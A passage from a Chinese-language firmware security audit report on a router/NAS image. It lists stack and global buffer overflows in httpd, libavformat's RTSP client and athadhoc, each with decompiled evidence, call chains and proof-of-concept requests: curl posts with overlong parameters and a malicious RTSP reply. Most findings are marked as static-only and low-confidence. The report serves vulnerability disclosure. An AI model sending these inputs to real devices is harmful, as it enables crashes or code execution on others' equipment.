httpd /userRpm/WlanSecurityRpm.htm（管理员认证） → httpd 无线配置处理 → ucm 协议 IPC（127.0.0.1:51237 TCP，accept 校验回环） → uclited ucm_msgTaskCreate(0x41f3fc) recv/分帧 → ucm 配置分发(ucm_cfg_handler) → 无线安全配置处理(ucWlanSecurityConfigSet 0x4ccf64 等) → execWlanCmd(0x49c84c) case15/21 → v21[132] 逐字符引号包装溢出

**漏洞 PoC**：

```
管理员经 Web 设置 WPA-PSK 口令≥45 字符（合法上限 63 字符，任意非引号字符即可，如 63×'A'）：POST /userRpm/WlanSecurityRpm.htm?doType=config&...&wpaPsk=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA（63 个 A）→ httpd 保存配置并经回环 IPC 下发 uclited → 无线配置应用 execWlanCmd(case15/21) 逐字符包装 63 字符密钥写入 v21[132]，溢出 57 字节。验证：gdb/uclited 下断 0x49c84c case15 分支，观察 v21 之后栈区域被覆盖。
```


### 漏洞 11：libavformat ff_rtsp_connect OPTIONS 应答 Public 字段无界 strcpy 栈溢出（CWE-121）（F-mt4tq5ud-30c1）

- **漏洞类型**：stack-overflow（CWE-121）
- **危害等级**：中危（置信度 0.45）
- **影响组件**：lib/libavformat.so.54.6.100（md5: 013126995a8c8228fc47c9d7a6ca9699）
- **漏洞位置**：ff_rtsp_connect @ 0x6d968
- **可达性**：static-only
- **漏洞描述**：minidlna 所链接的 libavformat.so.54 中 ff_rtsp_connect（0x6d968）在 RTSP OPTIONS 交互后，若服务器应答解析字段（s[1601] 起，来自应答头 Public/Server 段，经 ff_rtsp_parse_reply 存入应答结构，字节偏移 6404）与 "WMServer/" 前缀不匹配且第二轮 OPTIONS 标志置位时，执行 strcpy(dest[64], &s[1601])，把攻击者 RTSP 服务器应答中的该字段无界拷入 64 字节栈缓冲 dest（sp+0x4C），超过 63 字节即覆盖相邻 format[128]/addr/host 等局部直至保存寄存器；无长度限制。触发前提：minidlna 以 avformat 打开攻击者可控的 RTSP URL（NAS 卷上放置名为 rtsp://<attacker>/xx 的媒体文件被扫描探测，或 RTSP 流媒体 URL 配置），由攻击者服务器返回超长应答。MIPS 无栈保护环境（相关二进制 checksec 均无 canary）可致 RCE/DoS。
- **漏洞证据**：
  1. libavformat md5 01312699 ff_rtsp_connect 0x6d968: if(av_strncasecmp(&s[1617],"WMServer/",9)){ if(s[568]==1) strcpy(dest, (char*)&s[1601]); } — dest 声明 char dest[64] [sp+4Ch]，无条件限
  2. 后续 av_strlcpy(v2+572, dest, 64) 亦以 dest 为源，印证 dest 为 64B 的会话/传输名缓冲
  3. 应答结构 s = _DWORD s[1716]（6864B）由 ff_rtsp_parse_reply 填充，s[1601] 为应答头解析字段（偏移 6404B）
  4. checksec（同固件 httpd/dhcp6s/vsftpd/dnsproxy 系列）：canary=false nx=false pie=false

**调用链**：

NAS 卷媒体文件名(rtsp://attacker/x, 攻击者可放置) → minidlna 扫描/probe → avformat_open_input → rtsp 协议分发 → ff_rtsp_connect(0x6d968) → av_url_split/ffurl_connect 连接攻击者 RTSP 服务器 → ff_rtsp_parse_reply 解析 OPTIONS 应答(s[1601] 字段) → strcpy(dest[64], &s[1601]) → 栈溢出

**漏洞 PoC**：

```
1) 在 NAS 可写共享（USB/SMB）放置文件，名称形如 rtsp://192.168.x.x:554/trigger（触发 minidlna 以 RTSP 协议尝试探测）；2) 同网段主机 192.168.x.x:554 起 RTSP 服务，收到 OPTIONS 后应答：RTSP/1.0 200 OK\r\nCSeq: 1\r\nServer: WMServer2/x\r\nPublic: AAAAAAAAA...（>63 个 A，字段长≥200）\r\n\r\n；3) minidlna 解析出超长 Public/应答字段后 strcpy(dest[64]) 溢出 → 崩溃或（无 canary/NX）ROP。静态分析，未动态复核；reachability 依赖攻击者能向 NAS 放置媒体文件名或控制 RTSP URL。
```


### 漏洞 12：httpd NAS volumnName 参数无界 strcat 栈缓冲区溢出（CWE-121）（F-mt4uk9s8-cd70）

- **漏洞类型**：stack-overflow（CWE-121）
- **危害等级**：中危（置信度 0.4）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd（md5: 9582aa23b0bc2de099b9997b09457d01）
- **漏洞位置**：sub_49E330 @ 0x49e330
- **可达性**：static-only
- **漏洞描述**：httpd /userRpm/NasFolderAdvRpmNew.htm 处理器 sub_49E330（0x49e330，437 行）在 LABEL_40 段读取 POST 参数 volumnName 后：strcpy(v90, \"/tmp/usbdisk/\")（13 字节前缀）→ strcat(v90, v21) 将 volumnName 原样追加到 256 字节栈缓冲 v90（sp+0x338），无任何服务端长度校验。volumnName ≥ 243 字符即溢出 v90，覆盖相邻栈局部（v91 参数描述数组、v92..v97、v98[1948]dword 共享配置等）直至保存寄存器；httpd 无栈保护（canary=false,nx=false）。与已入库 displayName（sub_49D184）同属 NAS 共享管理页家族，此为独立函数/gadget。值经直接 POST 即可注入（Web 端 JS 长度限制可被绕过）。
- **漏洞证据**：
  1. httpd sub_49E330 0x49e330 LABEL_40: v21=httpGetEnv(a1,"volumnName"); if(v21){ memset(v90,0,0x100u); strcpy(v90,"/tmp/usbdisk/"); v22=strcat(v90,v21); snprintf(v89,0x100u,"%s",v22); ... —— strcat 无长度检查
  2. v90 声明 char v90[256] [sp+338h]（同一栈帧内 v91[2]/v92../v98[1948]dword 紧随其后）
  3. httpd checksec: canary=false nx=false pie=false relro=none（trace 70f79dca3ee7 官方输出）
  4. 唯一前置为 0x49E330 的 subpage/modify 流程进入条件：实现为 if(!modify) 分支内的 volumnName 处理，直接 POST 即可命中

**调用链**：

POST /userRpm/NasFolderAdvRpmNew.htm VolumnName=AAAA...(≥243B, admin 会话) → httpDispatcher(0x425d08) 匹配 → sub_49E330(0x49e330) → LABEL_40: httpGetEnv(\"volumnName\") → strcpy(v90,\"/tmp/usbdisk/\") → strcat(v90, volumnName)（无界）→ 栈溢出(v90[256], 无 canary)

**漏洞 PoC**：

```
curl（已登录 cookie）：POST http://192.168.1.1/userRpm/NasFolderAdvRpmNew.htm 数据：volumnName=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA（≥243 个 A）&pageIndex=0 —— httpd 栈溢出崩溃（RST→看门狗重启）或（配合无 NX）ROP 提权。静态分析，未动态复核。
```


### 漏洞 13：httpd WlanNetworkRpm ssid 参数无界 strncpy 全局缓冲越界写（CWE-120）（F-mt4umrtg-9528）

- **漏洞类型**：buffer-overflow（CWE-120）
- **危害等级**：中危（置信度 0.35）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd（md5: 9582aa23b0bc2de099b9997b09457d01）
- **漏洞位置**：sub_468380 @ 0x468380
- **可达性**：static-only
- **漏洞描述**：httpd /userRpm/WlanNetworkRpm.htm 处理器 sub_468380（0x468380）在非 Save 渲染分支读取 POST/GET 参数 ssid 后执行 v29=strlen(v27); strncpy(byte_5EF530, v28, v29); *((_BYTE *)&httpWlanBasicCfg[6] + strlen(v28)) = 0; —— 拷贝长度原样取攻击者字符串长度且无上限，越过全局缓冲 byte_5EF530（其相邻全局区 dword_5EF5CC/dword_5EF5D0/httpWlanBasicCfg 等紧随）执行 BSS 越界写；同时 NUL 终止符按 strlen 写入 httpWlanBasicCfg 偏移 6+strlen 处（httpWlanBasicCfg 为 0x168 字节全局，超长即越过其边界）。同理 newBridgessid 参数 strncpy(&byte_5EF5F4, v18, strlen(v18)) 同型。Web 端 JS 限 SSID≤32 可直接绕过（以任意长度 POST）。
- **漏洞证据**：
  1. httpd sub_468380 0x468380: if(v27=httpGetEnv(a1,"ssid")){ v29=strlen(v27); strncpy(byte_5EF530, v28, v29); *((_BYTE*)&httpWlanBasicCfg[6]+strlen(v28))=0; } —— 拷贝长度=输入长度，无上限
  2. 同函数 newBridgessid: v19=strlen(v17); strncpy(&byte_5EF5F4, v18, v19); *((_BYTE*)&httpWlanBasicCfg[55]+strlen(v18))=0;
  3. byte_5EF530 邻接全局：dword_5EF5CC/dword_5EF5D0/dword_5EF5D8/dword_5EF5E8/dword_5EF5F0/byte_5EF5F4/byte_5EF615 等（同函数 pageParaSet 引用）
  4. 应用侧 execWlanCmd case7 才有 len<33 检查 —— 渲染分支无此检查，直接 POST 即可越界
  5. httpd checksec canary=false nx=false

**调用链**：

POST/GET /userRpm/WlanNetworkRpm.htm（admin 会话，ssid=超长字符串，无 Save 参数） → httpDispatcher(0x425d08) → sub_468380(0x468380) → httpGetEnv(\"ssid\") → strncpy(byte_5EF530, ssid, strlen(ssid)) + *(httpWlanBasicCfg+6+strlen)=0 → BSS 越界写

**漏洞 PoC**：

```
curl -b cookies 'http://192.168.1.1/userRpm/WlanNetworkRpm.htm?ssid=AAAAAAAA...（≥0x168+8 个 A）' —— httpd 渲染分支对全局 byte_5EF530/httpWlanBasicCfg 区执行无界写，破坏相邻全局状态（无线配置缓存/标志），可致后续无线配置错乱或崩溃；配合后续 uclited 应用可污染无线状态。静态分析，未动态复核；影响受限于 BSS 区（无直接控制流），评级 medium。
```


### 漏洞 14：httpd WlanSecurityRpm radiusSecret 无界 strcpy 全局缓冲越界写（CWE-120）（F-mt4uric9-3a51）

- **漏洞类型**：buffer-overflow（CWE-120）
- **危害等级**：中危（置信度 0.3）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd（md5: 9582aa23b0bc2de099b9997b09457d01）
- **漏洞位置**：sub_46B5FC @ 0x46b5fc
- **可达性**：static-only
- **漏洞描述**：httpd /userRpm/WlanSecurityRpm.htm 处理器 sub_46B5FC（0x46b5fc）在 Save 分支读取 WPA-Enterprise 共享密钥参数 radiusSecret 后直接 strcpy(byte_5EF6A0, v30)，无任何长度校验（同页 pskSecret 有 strlen-8>=0x39 拒绝规则、WEP key 有 v40 长度精确匹配，唯独 radiusSecret 缺失）。任意长字符串经直接 POST 越界写全局 byte_5EF6A0（相邻全局区含 byte_5EF720/byte_5EF68C.../dword_5EF684 等无线状态标志），可破坏相邻无线配置状态。Web JS 长度限制可绕过。属 BSS 越界写（非栈），影响限于全局状态区。
- **漏洞证据**：
  1. httpd sub_46B5FC 0x46b5fc: v30=(const char*)httpGetEnv(a1,"radiusSecret"); if(!v30){...} strcpy(byte_5EF6A0, v30); —— 无长度检查
  2. 同函数 pskSecret 分支有 if(strlen(v20)-8>=0x39) goto error 的长度管控；WEP key 有 v40!=((byte_5EF778==1)+1)*v14 长度匹配——唯 radiusSecret 缺失
  3. byte_5EF6A0 全局定位：同函数 pageParaSet(&v69, byte_5EF6A0, 8) 引用；邻接 byte_5EF720（pskSecret strcpy 目标）
  4. httpd checksec: canary=false nx=false pie=false

**调用链**：

POST /userRpm/WlanSecurityRpm.htm（admin 会话, Save=1&secType=2&radiusSecret=<超长>） → httpDispatcher(0x425d08) → sub_46B5FC(0x46b5fc) → httpGetEnv(\"radiusSecret\") → strcpy(byte_5EF6A0, radiusSecret)（无界） → BSS 越界写

**漏洞 PoC**：

```
curl -b cookies -d 'Save=1&secType=2&radiusIp=192.168.1.10&radiusPort=1812&radiusSecret=BBBB...（≥0x80 个 B）' 'http://192.168.1.1/userRpm/WlanSecurityRpm.htm' —— httpd 将 radiusSecret 无界 strcpy 到全局 byte_5EF6A0，覆盖相邻无线配置标志/口令区（含 byte_5EF720 WPA 口令、配置标志位）。静态分析，未动态复核；典型利用为破坏无线配置状态，间接影响后续无线应用链。
```


### 漏洞 15：athadhoc 十六进制密钥解析超长参数越界写全局（边界检查失效，CWE-787）（F-mt4v3lin-97a3）

- **漏洞类型**：out-of-bounds-write（CWE-787）
- **危害等级**：低危（置信度 0.3）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/sbin/athadhoc（md5: 53a5015af68ecf517285cb18d3aeab27）
- **漏洞位置**：sub_400C00 @ 0x400c00
- **可达性**：static-only
- **漏洞描述**：athadhoc（IN-001 UDP 无线 adhoc 配置工具）main 以 argv[3]/argv[4] 十六进制密钥串调用 sub_400C00(0x400c00) 解析入 16 字节全局缓冲 ath_group_key/ath_ucast_key（参数 a3=0x10）。sub_400C00 的越界分支：if (a3 < v6) { printf("too much data in %s, max %u bytes"...); } 之后无任何返回/截断，直接 goto LABEL_13 继续执行 *(_BYTE *)(a2 + v6++) = ... —— 边界检查仅打印，不阻止写入，超长密钥（>2*0x10 个 hex 字符）持续越界写全局。qemu-user 实测（512 hex 字符 argv 触发，qe-95cc085a）进程进入主循环未 SIGSEGV（越界写落在相邻全局区，破坏状态但不致敏），动态确认写面存在且不崩溃。触发面为启动 argv（本地/厂商脚本），非网络。
- **漏洞证据**：
  1. athadhoc sub_400C00 0x400c00: LABEL_21: printf("too much data in %s, max %u bytes\n", a1, a3); goto LABEL_13; LABEL_13: *(_BYTE *)(a2 + v6++) = v12|v11; —— 越界分支只打印不截断
  2. main 0x4010c0: v7=sub_400C00(v6 /*argv[3]*/, &ath_group_key, 0x10u); ath_group_key_len=v7; …… sub_400C00(v8 /*argv[4]*/, &ath_ucast_key, 0x10u)
  3. qemu-exec qe-95cc085a：512 hex 字符 argv 下进程进入 recvmsg 主循环持续打印（signal 9=8s 超时外部 kill，非 SIGSEGV）——动态确认越界写不崩但写面存在
  4. checksec 同族无 canary/nx（mips be）

**调用链**：

athadhoc 启动（argv[3]/argv[4]=超长 hex 密钥, 厂商脚本/本地面） → main(0x4010c0) → sub_400C00(0x400c00)(buf=ath_group_key/ath_ucast_key, 0x10) → hex 解析循环越界: LABEL_21 打印后 goto LABEL_13 继续写 *(a2+v6++) → 全局越界写（a3 检查失效）

**漏洞 PoC**：

```
athadhoc ath0 0 4141...(>32 个 hex 字符，例如 512 个) 4242...(同长) —— sub_400C00 越过 16B 上限后继续把后续 hex 解码字节写入 ath_group_key/ath_ucast_key 及其后全局（ath_group_key_len 等）。qemu 实测（qe-95cc085a）未 SIGSEGV；仅本地启动参数可触发，影响限于全局状态区。
```

